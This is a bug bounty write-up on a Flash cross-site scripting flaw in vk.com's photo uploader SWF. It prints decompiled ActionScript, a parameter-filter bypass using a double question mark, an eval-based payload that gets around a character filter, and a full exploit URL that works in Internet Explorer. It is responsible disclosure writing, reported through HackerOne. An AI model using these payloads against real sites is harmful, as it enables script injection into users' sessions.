---
layout: post
title: "Interesting flash xss on vk.com"
categories: Hacks
tags: hacks
image: http://i.imgur.com/wBhOE51.png?1
---

### Introduction

Every time I try a bug bounty program on **HackerOne**, I first check for flash files on the domains which are in scope. Flash files are always
a good target as far as I am concerned. Approximately three months back, I came across **VK.com** bug bounty. So, when I searched for flash files
I came across one file named **photo_uploader_lite.swf**. So, I opened the file in my browser and the file got downloaded instead of getting played
in the browser. I ran curl to check the response headers and body.

```
$ curl -i http://vk.com/swf/photo_uploader_lite.swf

HTTP/1.1 200 OK
Server: Apache
Date: Wed, 30 Sep 2015 14:14:31 GMT
Content-Type: application/zip
Content-Length: 12189
Last-Modified: Tue, 21 Jul 2015 16:43:33 GMT
Connection: keep-alive
ETag: "55ae76b5-2f9d"
Expires: Sun, 04 Oct 2015 14:14:31 GMT
Cache-Control: max-age=345600
Accept-Ranges: bytes
```

The file was being served with content type `application/zip`. When I saw the first few bytes of the flash files I recognized the **CWS** file
header which is present for compressed flash files. This flash file will work as expected when embedded using an *object* or *embed* tag. But for a flash
xss, you cannot embed swf on your domain (No actionscript methods were exposed to JS). At this point of time, I lost hopes but still wanted to
have a look at the decompiled code. The following snippet only consists of the interesting code segments for better readability.

{% highlight actionscript linenos %}
package {
    // some imports
    class ExternalCall {
        public static function Simple(_arg1:String):void{
            Call(_arg1);
        }
        private static function Call(... _args):Boolean{
            var _local2:Array;
            var _local3:RegExp;
            if (ExternalInterface.available){
                _local2 = (_args as Array);
                _local3 = /[^().a-z0-9_]/gi;
                _local2[0] = _local2[0].replace(_local3, "");
                return (ExternalInterface.call.apply(null, _local2));
            };
            return (false);
        }
}
package {
    // some imports
    public class Main extends Sprite {

        public function Main():void{
            super();
            if (stage){
                this.init();
            } else {
                addEventListener(Event.ADDED_TO_STAGE, this.init);
            };
        }
        private function init(_arg1:Event=null):void{
            var mouseMove:* = null;
            var mouseOut:* = null;
            var e = _arg1;
            if (some_mouse_over_condition) {
                mouseOver();
            }
            var mouseOver:* = function ():void{
                ExternalCall.Simple(config.onMouseOver);
                stage.addEventListener(Event.MOUSE_LEAVE, mouseOut);
                insideFrame = true;
            };
        }
    }
}
package {
    // some imports

    public class Config {

        private static var _config:Object = {
            // ... some params ...
            onMouseOver:"debugLog",
            // ... some more params ...
        };

        public static function loadConfig(_arg1:LoaderInfo):Object{
            var parameters:* = null;
            var urlQuery:* = null;
            var urlVars:* = null;
            var key:* = null;
            var loaderInfo:* = _arg1;
            try {
                loaderInfo = LoaderInfo(loaderInfo);
                parameters = loaderInfo.parameters;
                urlQuery = loaderInfo.url.split("?")[1];
                urlVars = new URLVariables(((urlQuery) || ("")));
                for (key in urlVars) {
                    if (parameters[key]){
                        delete parameters[key];
                    };
                };
                setConfig(parameters);
            } catch(error:Error) {
            };
            return (_config);
        }

    }
}
{% endhighlight %}

The cleansing of parameters object was being done in the method **loadConfig**. So, any parameter provided in the url is removed from the parameters object.
This looked to me like a protection against flash xss because in a legitimate embed scenario parameters are provided through the **param** html tag. Ideally,
this is a really good way but they forgot something. Have a look at **line 66**. They are extracting url parameters by `loaderInfo.url.split("?")[1]`. What
if the url is something like

```
http://vk.com/swf/photo_uploader_lite.swf?h=h?&param1=value1
```

As far as flash player is concerned the parameters object will have the following values

```
h = h?
param1 = value1
```

But the url parameters extracted by swf will have the following values (as they are considering only 1 index element after splitting)

```
h = h
```

So, when they try to remove url parameters from the flash parameters object, only `h` gets removed but not `param1`. So, we successfully got our
url parameter to stay intact in the parameters object. Cool. **Line 39** has a call to `ExternalCall.Simple` with argument `config[onMouseOver]`. Now
ideally if you put anything like `alert(1)`, `confirm(1)` etc.. it will work. For me a bug is something which can be exploitable. Our next challenge
lies at **line 12**. The only allowed characters in your javascript call are `a-z`,`0-9`,`(`,`)`,`.`,`_`. Javascript strings are common part of any
useful payload, but quotes are filtered here. `,` is not allowed which prevents usage of `String.fromCharCode`. `window.location.hash` came to my mind. So,
a working payload will be

{% highlight javascript %}
eval(window.location.hash.substr(1))
{% endhighlight %}

Now you can place any js code in the fragment part of the url. All this is awesome, but the file is not played by the browser as of now because of the content
type. In this desperate time, my old friend **IE** came to my rescue. If you carefully observe the response headers there is no `X-Content-Type-Options`.
So, when I opened the url in IE, KABOOOOM!!! It sniffed the content type and played the flash file. Ah, the bug is finally exploitable but only in **IE**

```
http://vk.com/swf/photo_uploader_lite.swf?h=h?&onMouseOver=eval(window.location.hash.substr(1))#alert(document.domain);
```

A different payload is in the image

![vk.com Flash XSS](http://i.imgur.com/wBhOE51.png?1)

**HackerOne Report is present [here](https://hackerone.com/reports/66121)** (Not public at the time of writing)
